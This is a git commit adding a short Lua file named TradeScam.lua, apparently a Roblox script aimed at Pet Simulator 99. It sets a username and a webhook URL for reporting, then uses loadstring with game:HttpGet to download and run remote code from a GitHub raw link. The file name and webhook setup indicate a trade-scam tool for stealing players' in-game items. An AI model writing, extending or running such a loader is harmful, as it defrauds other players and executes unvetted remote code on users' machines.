a6fa45b1e7b4e468c69293910b4374a77db0b9e8
VAXnO09 <yoyokyoyo267@gmail.com>
2025-04-17 11:29:52 +0300

    Update and rename TradeScam to TradeScam.lua

---
+++ TradeScam.lua
@@ -0,0 +1,4 @@
+Username = "Vacno_5" -- << Your Username
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=VGZvUnhKSlMtRDYzYzdlRW9BR1JUdzotb3ZxR0NydEFGVjdRMFR3Qnl0elZveFJWTHNOWU81UERxTXp4V016Tjh5ZlZyaGNrRHBseHVi ODVYZV84QUtrVXF6NjhSbEJMejVVU2plMDEyV3ZQRl9Gd0VVbWFHT2gweU5SVVhIYnRoUzeEyMWlkS TNodjNOaW1ZMTdKaHRmOVE1cWJYbWdIUXhIdnZoaUV4NEdzbmdhclBsYVo5WENiRkxUSXlpZy10NDQ" -- << Your Webhook
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/ps99/refs/heads/main/Rua99"))()
